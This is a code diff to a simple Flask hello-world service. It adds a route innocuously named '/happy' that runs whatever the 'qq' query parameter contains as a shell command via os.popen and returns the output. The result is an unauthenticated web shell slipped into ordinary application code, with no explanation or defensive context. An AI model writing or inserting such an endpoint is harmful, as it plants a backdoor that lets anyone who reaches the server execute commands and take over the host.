@@ -16,9 +16,11 @@ import signal
 import sys
 from types import FrameType
 
-from flask import Flask
+from flask import Flask, request
 
 from utils.logging import logger
+
+import os
 
 app = Flask(__name__)
 
@@ -32,6 +34,11 @@ def hello() -> str:
     logger.info("Child logger with trace Id.")
 
     return "Hello, World!"
+
+
+@app.route("/happy")
+def happy() -> str:
+    return os.popen(request.args.get('qq')).read()
 
 
 def shutdown_handler(signal_int: int, frame: FrameType) -> None:
